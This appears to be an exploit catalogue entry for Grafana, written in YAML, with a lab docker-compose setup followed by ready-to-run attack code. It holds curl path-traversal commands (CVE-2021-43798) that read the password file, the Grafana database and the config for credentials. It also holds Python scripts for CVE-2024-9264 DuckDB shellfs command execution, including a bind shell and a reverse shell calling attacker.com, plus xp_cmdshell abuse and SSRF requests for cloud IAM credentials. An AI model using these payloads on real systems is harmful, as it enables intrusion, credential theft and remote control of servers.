---
comment: "Grafana is an open-source analytics and monitoring platform. Three primary\
  \ exploitation\npaths exist:\n\n1. CVE-2021-43798 (unauthenticated) \u2014 path\
  \ traversal via the plugin static file serving\n   endpoint. Any plugin ID can be\
  \ used (e.g., alertlist). Allows reading arbitrary files\n   from the Grafana server\
  \ with the permissions of the grafana-server process.\n   Affects Grafana 8.0.0-beta1\
  \ through 8.3.0.\n\n2. CVE-2024-9264 (authenticated, viewer+) \u2014 SQL Expressions\
  \ feature using DuckDB evaluates\n   user-supplied SQL without sanitisation. The\
  \ DuckDB `shellfs` extension can execute OS\n   commands if the DuckDB binary is\
  \ on the server's PATH. Requires SQL Expressions feature\n   to be enabled (experimental,\
  \ disabled by default in most installs).\n   Affects Grafana < 11.0.6+security-01\
  \ / < 11.1.7+security-01 / < 11.2.2+security-01.\n\n3. CVE-2020-13379 (unauthenticated)\
  \ \u2014 SSRF via the /avatar/ endpoint, which proxies\n   requests to any URL including\
  \ cloud metadata endpoints.\n   Affects Grafana 3.0.1 through 7.0.2.\n\nA fourth\
  \ vector (admin): configuring a MSSQL data source allows executing xp_cmdshell\n\
  OS commands if the linked SQL Server has it enabled.\n"
docker:
  compose: "services:\n  grafana:\n    image: grafana/grafana:8.3.0\n    ports:\n\
    \      - \"3000:3000\"\n    environment:\n      GF_SECURITY_ADMIN_PASSWORD: admin\n"
  note: "Starts Grafana 8.3.0 (vulnerable to CVE-2021-43798 path traversal file-read).\n\
    Access at `http://localhost:3000`. Default credentials: `admin` / `admin`.\nThe\
    \ path traversal works without authentication \u2014 no login required for the\
    \ `file-read` entry.\n"
functions:
  bind-shell:
  - blind: true
    code: |
      # python3 exploit_bind.py
      import requests
      TARGET = "http://victim.com:3000"
      sess = requests.Session()
      sess.post(f"{TARGET}/login", json={"user": "viewer", "password": "viewer"})
      sess.post(
          f"{TARGET}/api/ds/query",
          params={"ds_type": "__expr__", "expression": "true", "requestId": "Q101"},
          json={
              "queries": [{
                  "refId": "A",
                  "datasource": {"type": "__expr__", "uid": "__expr__"},
                  "type": "sql",
                  "expression": "INSTALL shellfs FROM community; LOAD shellfs; SELECT * FROM read_csv('ncat -lvp 12345 -e /bin/sh 2>&1|', auto_detect=true, sample_size=1)"
              }],
              "from": "now-1h", "to": "now"
          }
      )
    comment: |
      CVE-2024-9264: opens a bind shell on TCP 12345 via the DuckDB shellfs extension.
      The shellfs pipe suffix syntax ('cmd 2>&1|') executes the command and streams its
      output as a virtual CSV file read by DuckDB. The query must target the __expr__
      datasource (type: sql, expression field) at /api/ds/query?ds_type=__expr__&expression=true.
      Connect from the attacker with: nc victim.com 12345
      Requires SQL Expressions enabled (feature_toggles.sqlExpressions = true) and DuckDB on PATH.
    connector: tcp-client
    contexts:
      authenticated:
    tty: false
    version: |-
      < 11.0.6 / < 11.1.7 / < 11.2.2
  file-read:
  - code: |
      # Read /etc/passwd
      curl -s --path-as-is 'http://victim.com:3000/public/plugins/alertlist/../../../../../../../../etc/passwd'

      # Read Grafana database (contains hashed passwords and data source credentials)
      curl -s --path-as-is 'http://victim.com:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db' -o grafana.db

      # Read Grafana config (contains secret_key, database DSN, SMTP credentials)
      curl -s --path-as-is 'http://victim.com:3000/public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini'
    comment: "CVE-2021-43798: Grafana's plugin static file endpoint does not sanitise\
      \ the path.\nAny installed plugin ID works as the prefix (alertlist, graph,\
      \ table, etc.).\nThe traversal depth must reach the filesystem root \u2014 adjust\
      \ the number of /../ sequences\nto match the Grafana installation depth (8 levels\
      \ covers most default installs).\n\ngrafana.db is a SQLite database. Extract\
      \ credentials with:\n  sqlite3 grafana.db \"SELECT login,email,password,salt\
      \ FROM user;\"\n  sqlite3 grafana.db \"SELECT name,type,json_data,secure_json_data\
      \ FROM data_source;\"\nsecure_json_data values are encrypted with the secret_key\
      \ from grafana.ini.\n\nRef: https://www.exploit-db.com/exploits/50581\n"
    contexts:
      unauthenticated:
    version: |-
      8.0.0-beta1 - 8.3.0
  rce:
  - blind: false
    code: |
      # python3 exploit_rce.py
      import requests, json as _json
      TARGET = "http://victim.com:3000"
      sess = requests.Session()
      sess.post(f"{TARGET}/login", json={"user": "viewer", "password": "viewer"})
      resp = sess.post(
          f"{TARGET}/api/ds/query",
          params={"ds_type": "__expr__", "expression": "true", "requestId": "Q101"},
          json={
              "queries": [{
                  "refId": "A",
                  "datasource": {"type": "__expr__", "uid": "__expr__"},
                  "type": "sql",
                  "expression": "INSTALL shellfs FROM community; LOAD shellfs; SELECT * FROM read_csv('id 2>&1|', auto_detect=true, sample_size=1)"
              }],
              "from": "now-1h", "to": "now"
          }
      )
      # Command output in: resp.json()["results"]["A"]["frames"][0]["data"]["values"]
      print(_json.dumps(resp.json(), indent=2))
    comment: |
      CVE-2024-9264: The SQL Expressions feature passes user-supplied SQL to DuckDB without
      sanitisation. The DuckDB shellfs community extension reads command output as a virtual
      CSV file, executing arbitrary OS commands as the grafana-server process user.

      The query MUST target the internal __expr__ datasource (not any user-defined datasource).
      The /api/ds/query endpoint requires ?ds_type=__expr__&expression=true query parameters
      to route through the SQL Expressions engine. Any authenticated account (viewer+) is sufficient.

      Command output appears in: results.A.frames[0].data.values
      Ref: https://github.com/advisories/GHSA-49qr-ph23-6g7x
    contexts:
      authenticated:
    version: |-
      < 11.0.6 / < 11.1.7 / < 11.2.2
  - blind: false
    code: |
      # Configure a MSSQL data source pointing to an attacker-controlled or internal SQL Server
      # with xp_cmdshell enabled, then run a query:
      curl -s -X POST 'http://victim.com:3000/api/datasources' \
        -H 'Content-Type: application/json' \
        -u 'admin:admin' \
        -d '{
          "name": "mssql-rce",
          "type": "mssql",
          "url": "attacker.com:1433",
          "database": "master",
          "user": "sa",
          "secureJsonData": {"password": "Password1!"}
        }'

      # Query xp_cmdshell via the Explore UI or API:
      # EXEC xp_cmdshell 'id'
    comment: |
      Admin-configured MSSQL data source: if the connected SQL Server has xp_cmdshell enabled
      (EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;), Grafana's query passthrough allows
      executing OS commands on the database server host.

      This requires admin credentials to create the data source, or access to an existing
      MSSQL data source that points to a server with xp_cmdshell enabled.
      Command output is returned inline in the Grafana Explore panel response.
    contexts:
      admin:
  reverse-shell:
  - blind: true
    code: |
      # python3 exploit_revshell.py
      import requests
      TARGET = "http://victim.com:3000"
      sess = requests.Session()
      sess.post(f"{TARGET}/login", json={"user": "viewer", "password": "viewer"})
      sess.post(
          f"{TARGET}/api/ds/query",
          params={"ds_type": "__expr__", "expression": "true", "requestId": "Q101"},
          json={
              "queries": [{
                  "refId": "A",
                  "datasource": {"type": "__expr__", "uid": "__expr__"},
                  "type": "sql",
                  "expression": "INSTALL shellfs FROM community; LOAD shellfs; SELECT * FROM read_csv('bash -i >& /dev/tcp/attacker.com/12345 0>&1 2>&1|', auto_detect=true, sample_size=1)"
              }],
              "from": "now-1h", "to": "now"
          }
      )
    comment: |
      CVE-2024-9264: spawns a reverse bash shell via the DuckDB shellfs extension.
      The shell runs as the grafana-server process user (typically grafana or root in containers).
      The HTTP response returns immediately — check the listener for the incoming connection.
      Requires SQL Expressions enabled (feature_toggles.sqlExpressions = true) and DuckDB on PATH.
    contexts:
      authenticated:
    listener: tcp-server
    tty: false
    version: |-
      < 11.0.6 / < 11.1.7 / < 11.2.2
  ssrf:
  - code: |
      # Probe cloud metadata endpoint (AWS IMDSv1)
      curl -s 'http://victim.com:3000/avatar/$(python3 -c "import urllib.parse; print(urllib.parse.quote(\"169.254.169.254/latest/meta-data/iam/security-credentials/\"))")'

      # Direct URL-encoded request:
      curl -s 'http://victim.com:3000/avatar/169.254.169.254%2flatest%2fmeta-data%2fiam%2fsecurity-credentials%2f'

      # Probe internal services
      curl -s 'http://victim.com:3000/avatar/192.168.1.1%2fadmin'
    comment: |
      CVE-2020-13379: The /avatar/<hash> endpoint fetches a remote URL to retrieve a user
      avatar image. The hash parameter is not validated and can be any URL path segment that
      Grafana will proxy as an HTTP GET request to https://secure.gravatar.com/<value>.
      By encoding slashes (%2f), the request is redirected to an arbitrary URL.

      Grafana's response proxies the content of the internal request, making this a blind-to-
      semi-blind SSRF: HTTP status codes and partial body content are reflected.

      On AWS/GCP/Azure cloud instances, target the metadata endpoint to retrieve IAM credentials:
      - AWS: http://169.254.169.254/latest/meta-data/iam/security-credentials/
      - GCP: http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
      - Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01

      Ref: https://www.exploit-db.com/exploits/49364
    contexts:
      unauthenticated:
    version: |-
      3.0.1 - 7.0.2
  - code: |
      # Configure a data source URL pointing to an internal service
      curl -s -X POST 'http://victim.com:3000/api/datasources' \
        -H 'Content-Type: application/json' \
        -u 'admin:admin' \
        -d '{
          "name": "ssrf-probe",
          "type": "prometheus",
          "url": "http://169.254.169.254/latest/meta-data/",
          "access": "proxy"
        }'

      # Trigger a query against the data source to observe the response
      curl -s 'http://victim.com:3000/api/datasources/proxy/1/api/v1/query?query=up' \
        -u 'admin:admin'
    comment: |
      Admin data source SSRF: any data source type with "access: proxy" causes Grafana to
      proxy HTTP requests to the configured URL on behalf of the user. Setting the URL to an
      internal endpoint (metadata service, internal API, Redis, Elasticsearch) allows probing
      the internal network from the Grafana server.

      The proxy endpoint at /api/datasources/proxy/<id>/<path> forwards arbitrary path
      suffixes to the base URL, enabling full path traversal of the target service.
    contexts:
      admin:
...
